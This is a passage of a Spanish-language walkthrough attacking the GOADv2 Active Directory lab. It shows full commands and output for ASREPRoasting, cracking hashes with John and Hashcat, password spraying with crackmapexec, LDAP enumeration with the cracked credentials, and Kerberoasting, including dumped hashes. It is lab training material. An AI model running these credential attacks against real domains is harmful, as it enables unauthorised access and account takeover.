do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED

enum4linux complete on Tue Jul  4 20:37:56 2023
```

---

# Buscar contraseñas con Usuarios Enumerados

Vamos a realizar un ataque llamado ASREPRoast con el comando. `GetNPUsers.py north.sevenkingdoms.local/ -usersfile 11_Users.txt` 

## ASREPRoast

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #GetNPUsers.py north.sevenkingdoms.local/ -usersfile 11_Users.txt 
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User vagrant doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User SEVENKINGDOMS$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User eddard.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User catelyn.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:ba6c16c439c6c5d2491594a12aed48e6$8302b3c379e291bc3cd90fd0a7380dc008a5c54b815b131eca25142bfab2174322bedab6b732ad3111a95c6c08959ef52b75314110447569e10ead3c162f406a1d6aa6d0e692639ecc460d0dd4398e6f9e4937f50db200045c0b4d2dff0551e7196588d0fe223d407c5405c52885b56091a0c1487ce3d6a82da9045bf9d9a4e99977b8cd7b9e55ebb464dc9a9e869f26d8894c4a602d4eef37b217351ec4c7340d841049d901912d4fc961a196b2415eef535fb1fa7c5dfd1ff3b6bb1f041e935d0cda9bd95fb74306ec510193b17a5766d72790005e0c9fa019ea8babd115cbcdc2af6d54d6c5f43dec60b9a10eaf28bc8e5f91a4a5a6e1febe85c521b17943633dcaf29cd8
[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Actualmente, el TGT que se nos proporcionó se ha guardado en un archivo para su posterior crackeo.

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cat hashbrandon.stark 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hashbrandon.stark
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:ba6c16c439c6c5d2491594a12aed48e6$8302b3c379e291bc3cd90fd0a7380dc008a5c54b815b131eca25142bfab2174322bedab6b732ad3111a95
       │ c6c08959ef52b75314110447569e10ead3c162f406a1d6aa6d0e692639ecc460d0dd4398e6f9e4937f50db200045c0b4d2dff0551e7196588d0fe223d407c5405c52885b56091a0c1487ce3d6a82da9045bf9d9a4e99
       │ 977b8cd7b9e55ebb464dc9a9e869f26d8894c4a602d4eef37b217351ec4c7340d841049d901912d4fc961a196b2415eef535fb1fa7c5dfd1ff3b6bb1f041e935d0cda9bd95fb74306ec510193b17a5766d72790005e0
       │ c9fa019ea8babd115cbcdc2af6d54d6c5f43dec60b9a10eaf28bc8e5f91a4a5a6e1febe85c521b17943633dcaf29cd8
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Intentaremos descifrar este hash utilizando John the Ripper o Hashcat. Vamos a intentar ambas opciones. Con John, el comando es el siguiente:`john --wordlist='/usr/share/wordlists/rockyou.txt' hashbrandon.stark`

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #john --wordlist='/usr/share/wordlists/rockyou.txt' hashbrandon.stark 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iseedeadpeople   ($krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL)
1g 0:00:00:00 DONE (2023-07-05 20:15) 9.090g/s 502690p/s 502690c/s 502690C/s lileth..grad2010
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Mientras que con Hashcat se utiliza el comando. `hashcat -a 0 -m 18200 hashbrandon.stark /usr/share/wordlists/rockyou.txt`

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #hashcat -a 0 -m 18200 hashbrandon.stark /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 5808/5872 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 169 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:ba6c16c439c6c5d2491594a12aed48e6$8302b3c379e291bc3cd90fd0a7380dc008a5c54b815b131eca25142bfab2174322bedab6b732ad3111a95c6c08959ef5
2b75314110447569e10ead3c162f406a1d6aa6d0e692639ecc460d0dd4398e6f9e4937f50db200045c0b4d2dff0551e7196588d0fe223d407c5405c52885b56091a0c1487ce3d6a82da9045bf9d9a4e99977b8cd7b9e55ebb464dc9
a9e869f26d8894c4a602d4eef37b217351ec4c7340d841049d901912d4fc961a196b2415eef535fb1fa7c5dfd1ff3b6bb1f041e935d0cda9bd95fb74306ec510193b17a5766d72790005e0c9fa019ea8babd115cbcdc2af6d54d6c5
f43dec60b9a10eaf28bc8e5f91a4a5a6e1febe85c521b17943633dcaf29cd8:iseedeadpeople
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOC...f29cd8
Time.Started.....: Wed Jul  5 20:29:39 2023 (1 sec)
Time.Estimated...: Wed Jul  5 20:29:40 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   179.3 kH/s (8.50ms) @ Accel:32 Loops:1 Thr:64 Vec:16
Recovered........: 1/1 (100.00%) Digests
Progress.........: 61440/14344385 (0.43%)
Rejected.........: 0/61440 (0.00%)
Restore.Point....: 49152/14344385 (0.34%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: truckin -> sinead1

Started: Wed Jul  5 20:28:10 2023
Stopped: Wed Jul  5 20:29:42 2023
```

## Password Spray

Realizaremos un ataque de "Password Spray", que puede llevarse a cabo mediante varias herramientas, como crackmapexec, utilizando el comando `cme smb 192.168.56.11 -u User_nort.txt -p User_nort.txt --no-bruteforce`. Si el programa encuentra un usuario, se detendrá. Para evitar esto, se debe agregar la bandera `-continue-on-success`.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #cme smb 192.168.56.11 -u User_nort.txt -p User_nort.txt --no-bruteforce
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\alliser.thorne:alliser.thorne STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\archmaester.ebrose:archmaester.ebrose STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\arya.stark:arya.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\balon.greyjoy:balon.greyjoy STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\barristan.selmy:barristan.selmy STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\benjen.stark:benjen.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\beric.dondarrion:beric.dondarrion STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\bran.stark:bran.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\brienne.of:brienne.of STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\bronn:bronn STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\brother.ray:brother.ray STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\brynden.tully:brynden.tully STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\catelyn.stark:catelyn.stark STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\cersei.lannister:cersei.lannister STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\daario.naharis:daario.naharis STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\daenerys.targaryen:daenerys.targaryen STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\davos.seaworth:davos.seaworth STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\doran.martell:doran.martell STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\euron.greyjoy:euron.greyjoy STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\gendry:gendry STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\gilly:gilly STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\grand.maester:grand.maester STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\grey.worm:grey.worm STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\high.priestess:high.priestess STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\high.sparrow:high.sparrow STATUS_LOGON_FAILURE 
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
```

---

# Enumeración Con Usuarios

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%202.png)

Para obtener una lista completa de los usuarios, se utiliza la herramienta GetADUsers con el siguiente comando:`GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying north.sevenkingdoms.local for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2023-01-25 00:33:26.355985  2023-01-25 01:29:42.829335 
Guest                                                 <never>              <never>             
vagrant                                               2021-05-12 06:38:55.922520  2023-07-05 19:35:25.217332 
krbtgt                                                2023-01-25 00:44:27.813224  <never>             
                                                      2023-06-27 20:38:03.432290  <never>             
arya.stark                                            2023-01-25 00:59:58.115942  <never>             
eddard.stark                                          2023-01-25 01:00:00.289774  2023-07-05 21:35:38.349434 
catelyn.stark                                         2023-01-25 01:00:02.257672  <never>             
robb.stark                                            2023-01-25 01:00:04.166841  2023-07-06 18:21:25.977609 
sansa.stark                                           2023-01-25 01:00:06.006788  <never>             
brandon.stark                                         2023-01-25 01:00:07.850550  2023-07-05 20:10:58.504164 
rickon.stark                                          2023-01-25 01:00:09.647602  <never>             
hodor                                                 2023-01-25 01:00:11.381523  <never>             
jon.snow                                              2023-01-25 01:00:13.100407  <never>             
samwell.tarly                                         2023-01-25 01:00:14.897380  <never>             
jeor.mormont                                          2023-01-25 01:00:16.647458  <never>             
sql_svc                                               2023-01-25 01:00:18.429356  2023-07-05 19:59:21.431102
```

Otra opción es obtener una lista de usuarios mediante LDAP utilizando el siguiente comando: `ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'`

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
distinguishedName: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=Guest,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=vagrant,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=SEVENKINGDOMS$,CN=Users,DC=north,DC=sevenkingdoms,DC=loc
distinguishedName: CN=arya.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=catelyn.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=robb.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=brandon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=rickon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=hodor,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=samwell.tarly,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=sql_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=local
```

## Dump con ldapdomaindump

También es posible emplear la herramienta "Herramienta  ‣" con el propósito de llevar a cabo el proceso de volcado de datos

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #python3 /mnt/angussMoody/Scripts/Windows/ldapdomaindump/ldapdomaindump.py -u 'north.sevenkingdoms.local\brandon.stark' -p 'iseedeadpeople' 192.168.56.11
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Como resultado de este proceso, se generan archivos.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ll domain_*
Permissions Size User        Date Modified Name
.rwxrwxrwx   626 angussmoody  6 jul 18:40  domain_computers.grep
.rwxrwxrwx  1,7k angussmoody  6 jul 18:40  domain_computers.html
.rwxrwxrwx  7,9k angussmoody  6 jul 18:40  domain_computers.json
.rwxrwxrwx  1,7k angussmoody  6 jul 18:40  domain_computers_by_os.html
.rwxrwxrwx  9,6k angussmoody  6 jul 18:40  domain_groups.grep
.rwxrwxrwx   16k angussmoody  6 jul 18:40  domain_groups.html
.rwxrwxrwx   83k angussmoody  6 jul 18:40  domain_groups.json
.rwxrwxrwx   259 angussmoody  6 jul 18:40  domain_policy.grep
.rwxrwxrwx  1,2k angussmoody  6 jul 18:40  domain_policy.html
.rwxrwxrwx  6,5k angussmoody  6 jul 18:40  domain_policy.json
.rwxrwxrwx   182 angussmoody  6 jul 18:40  domain_trusts.grep
.rwxrwxrwx   997 angussmoody  6 jul 18:40  domain_trusts.html
.rwxrwxrwx  1,8k angussmoody  6 jul 18:40  domain_trusts.json
.rwxrwxrwx  4,2k angussmoody  6 jul 18:40  domain_users.grep
.rwxrwxrwx   12k angussmoody  6 jul 18:40  domain_users.html
.rwxrwxrwx   43k angussmoody  6 jul 18:40  domain_users.json
.rwxrwxrwx   20k angussmoody  6 jul 18:40  domain_users_by_group.html
```

Podemos crear un servidor HTTP utilizando Python

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Después de configurar el servidor, puedes acceder a través de tu navegador en "localhost" para visualizar los archivos y cargarlos directamente desde ahí

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%203.png)

Cuando observamos el archivo "domain_users.html", su contenido se presenta de la siguiente forma.

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%204.png)

Cómo se establece una conexión con "sevenkingdoms.local”

![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%205.png)

Utilizando las credenciales de este usuario, es posible realizar una enumeración de los usuarios presentes en "sevenkingdoms.local", debido a la existencia de una relación de confianza entre los dominios.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
└──╼ #ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
distinguishedName: CN=Administrator,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=Guest,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=vagrant,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=krbtgt,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=NORTH$,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=ESSOS$,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=tywin.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=jaime.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=cersei.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=robert.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=joffrey.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=loca
distinguishedName: CN=renly.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=stannis.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=loca
distinguishedName: CN=petyer.baelish,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=lord.varys,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=maester.pycelle,OU=Crownlands,DC=sevenkingdoms,DC=local
```

Un listado completo de los usuarios de "sevenkingdoms.local" ya ha sido obtenido.

```csharp
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #cat 10_Users_sevenkingdoms.local 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: 10_Users_sevenkingdoms.local
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Administrator
   2   │ Guest
   3   │ vagrant
   4   │ krbtgt
   5   │ NORTH$
   6   │ ESSOS$
   7   │ tywin.lannister
   8   │ jaime.lannister
   9   │ cersei.lannister
  10   │ tyron.lannister
  11   │ robert.baratheon
  12   │ joffrey.baratheon
  13   │ renly.baratheon
  14   │ stannis.baratheon
  15   │ petyer.baelish
  16   │ lord.varys
  17   │ maester.pycelle
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Kerberoasting

Además, se tiene la posibilidad de ejecutar un ataque conocido como "Kerberoasting". Al usar el comando `GetUserSPNs.py -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople` se logra la identificación de dos usuarios adicionales

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #GetUserSPNs.py -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                                 Name      MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
---------------------------------------------------  --------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
CIFS/winterfell.north.sevenkingdoms.local            jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2023-01-25 01:00:13.100407  <never>                     constrained 
HTTP/thewall.north.sevenkingdoms.local               jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2023-01-25 01:00:13.100407  <never>                     constrained 
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                               2023-01-25 01:00:18.429356  2023-07-05 19:59:21.431102              
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                               2023-01-25 01:00:18.429356  2023-07-05 19:59:21.431102
```

Ahora se procederá a obtener los TGS (Service Tickets).

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
/usr/local/lib/python2.7/dist-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                                 Name      MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
---------------------------------------------------  --------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
CIFS/winterfell.north.sevenkingdoms.local            jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2023-01-25 01:00:13.100407  <never>                     constrained 
HTTP/thewall.north.sevenkingdoms.local               jon.snow  CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2023-01-25 01:00:13.100407  <never>                     constrained 
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                               2023-01-25 01:00:18.429356  2023-07-05 19:59:21.431102              
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                               2023-01-25 01:00:18.429356  2023-07-05 19:59:21.431102              

[-] CCache file is not found. Skipping...
```

Se procede a la lectura del archivo recién creado.

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #cat kerberoasting.hashes 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: kerberoasting.hashes
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $krb5tgs$23$*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/jon.snow*$ec59cb8d62227338637e3d8d6f3feeb6$c8458e7a942e7f7a14fe5a4db528cbd2dca48211ea5eb8177415530
       │ 98b24f8be6e7118e89a2262b155f4de988263c3fcc16f364097bca8ac9eb4cadfacaadae792517824790a3ac98c9ed6fa7c1be3058d5d787e26a62dcc69dc15efd3312aab578ee93d60fc11b811e0ac9ce5101978db1
       │ ead260ba1a617d2af71831d7a2fa8e167e4a54fe7f6b656a24ee3ff073bdf87073a1298adbf8df35fc1d639fe7c0026ab5007336e2095919d9c9bd0921ad66a02e1a491ff38ecdc3d2d54ae4c1e9d7d2c4bc41cc5fb4
       │ c95f45ad4f43b4d4541292cb347aea060f9d61fb9582eb7eb0e026066262a2e71f418d1d66928f27ff05aaeaccdbbaaa9375003da6d37db12539368ea760353011bb56270d5c062d4ecee0ca62abedcde4b5033372c8
       │ f470e361610ad9cbd3a848739be2c36d2a9d666912e264b2b7a01958d176c82c9202eeeb36d33a0a5fa75f3691d8ffbe4d38b3f8921ce11a7f1f4e128b69ea352d5f03595217b83f3609fe264a65f55c660c47f2bf6f
       │ 20fbd3eb9ffeb919a3caa653a9dea88ca7ea2543f045d932ade153bf259a1070f60a85c569874021c87320d6baeae9becd0335761724859e914b67184b637d38892b243c671cc35b5ae2f44fe92013775e773386a7b8
       │ 25c3c635b83b3f21e9e071628638be0ffa16807282921c10a252827179a194b1f2b04a812f04134daa06db2f258b544b4a38e9263bc2d2fd146bb45fc3d27f6afffdf3835f0345bde3a9f8792681eb9986337bdc72c0
       │ 71e78b70b47f2cd715298329bdb496a5aa474ebfc3725b464fddbd57424530fde1161d22715057fa5fa125273dd05683b7d9152dc1bac2fadf8ecf0eed59e9598dc8a73ea3d1d149816344d683d2e6bda41a09014d79
       │ 229dd142d48f01c4fc8c18a659d236f424fdd3f1c2708d3fd192ceef9517718945d540650b28cc60ddda7a162a5f74cf2bfb3d9e51d0e5229f0b598f97fd4b2f66d1776254a9dfdf74114e71114e87e2d4c5a5ccb7f6
       │ 41033c7add5357b941274ef064c016fac0c656a1e29eec5244b453b25d98f2919d80b932ffccd3813ac0ff57a4efd91d5bafd9527e731cff085c5c1f6e7ff5c73d32f27c373aa09a166f91e8bd8c5abe7e7af8b532b2
       │ 9192f8abbdc640ced2d61491f9843f60538fa1588a045cb2ff8d938abd58d7f2be507672dcddd66afa798cda53a10dcbc6e2b2e7b2eb7abbdfc191843488bcf3c8b329b7ef590a0035240869d5d9c64f7124d6696646
       │ 1d37dffadda920e7880fd038c80cdaa4232d41411cb4e480fc1e470dd1925f708d521feb5f7e8c658fb29149bc00cb6c4707e4909f365b2d5bb3c60e6683d4627e48106577c44e7cd1f0eac2eb06cb1eefaefc45e3af
       │ b4bedff872a338c70102845b27365532b0863c4d99402fea647d91e9153e0f86ea90214628e0ae43dec7a26435d12773283ccb38c67808cc57f7cdb47156ff6ff3b06c1ee7a9123e0b05f017df4de950c34c6677fc43
       │ ec5104095ce442b9822c6ab
   2   │ $krb5tgs$23$*sql_svc$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local/sql_svc*$914daa72ad7d9c7464c3cd283cba980d$ea86bc3f0b3aee12757f5df2aa6158d1828f0c342cec790c9daad5f67
       │ 3bcbccc7fe6000088f924a306dad790ffda29e09e63525258dd191cb88bf7613376257c3440ee4bb5ca018d0b55e44605545f4337b151b6eeae11008358253861dccb39c103b5a9cdd9c110355cd0fe9cc487ed743d8
       │ b4869b6745e6d8bfae9bb031fd34a97cdd436326db32343ec49e382658e6ea1846c364be68447f5196abe879210fd41740faa63c26a0659ee989b45b15386f6bbab3f98742f088f698813103d78e1f585231f3922f3e
       │ 82f3fdece98dc485136bb49610223d535153633bde56737025c78dc452d7cb8887811e0e374b9dd66ec5afe7113a9ede26bef41b3ba52bc28433280292605ddc881ad1bbacfb0e00635c5318dbf94df0e934db51b584
       │ 4adc896069b89f2f3bd33cbd68074832371f69e40f4735d8bf425ab412dea66217093e15729c0f2e933ef98a7f180d2d5d782f785899a0220789077cd4f6a6de27ac85d646a76d9087664399e8387482765d7fc686b6
       │ 41ca67ffd38f48279eb579a539dee0bba7300b5e3fda96364c34ebd963c98c33d24830f642011ec05907e454ac550543d04330b4edd6db6e557ffb6240aac94a2f25d2ed64e54f5ca6aef0f74c26cc2a5db45816cb7b
